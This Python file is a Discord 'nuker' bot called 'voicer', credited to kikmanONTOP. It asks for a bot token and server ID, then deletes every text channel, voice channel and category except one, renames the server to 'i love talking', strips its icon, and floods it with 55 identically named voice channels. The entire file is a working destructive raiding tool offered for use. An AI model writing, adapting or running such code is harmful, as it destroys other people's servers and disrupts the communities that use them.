import discord
from discord.ext import commands
from colorama import init, Fore
import asyncio
import fade
voicer = '''
                                                                   
    |~~~~~~~~~~~~~~~|
    |~~~~~~~~~~~~~~~|   this tool loves talking
    |               |
/~~\|           /~~\|
\__/            \__/                            made by kikmanONTOP                    
                                                github.com/kikmanONTOP
           '''                                      


faded_text = fade.greenblue(voicer)
print(faded_text)
number_of_channels = 55
intents = discord.Intents.all()
bot = discord.Client(intents=intents)
token = input(Fore.LIGHTCYAN_EX + "discord bot token: ")
guild_id = input("server id: ")

@bot.event
async def on_ready():
    print(f"voicer is ready as {bot.user}")

    guild = bot.get_guild(int(guild_id))

    if guild is None:
        print("server id error")
        return
    
    if guild:
        ignore_channel_name = "OMGGGGGGGGGGGGGGGGGG"

        categories = [category for category in guild.categories if category.name != ignore_channel_name]
        text_channels = [channel for channel in guild.text_channels if channel.name != ignore_channel_name]
        voice_channels = [channel for channel in guild.voice_channels if channel.name != ignore_channel_name]

        for channel in text_channels:
            try:
                await channel.delete()
                await asyncio.sleep(0)
                print("deleted:", channel.name)
            except:
                pass
        for channel in voice_channels:
            try:
                await channel.delete()
                await asyncio.sleep(0)
                print("deleted:", channel.name)
            except:
                pass
        for category in categories:
            try:
                await category.delete()
                await asyncio.sleep(0)
                print("deleted", category.name)
            except:
                pass
        try:
            await guild.edit(name="i love talking")
            print("server name changed")
        except:
            print("name edit error")
        try:
            await guild.edit(icon=None)
            print("server pfp changed")
        except:
            print("pfp edit error")

    try:
        for i in range(number_of_channels):
            await guild.create_voice_channel(f'i love talking')
        print(f'{number_of_channels} voice channels created successfully.')
    except Exception as e:
        print(f'Error: {e}')

bot.run(token)
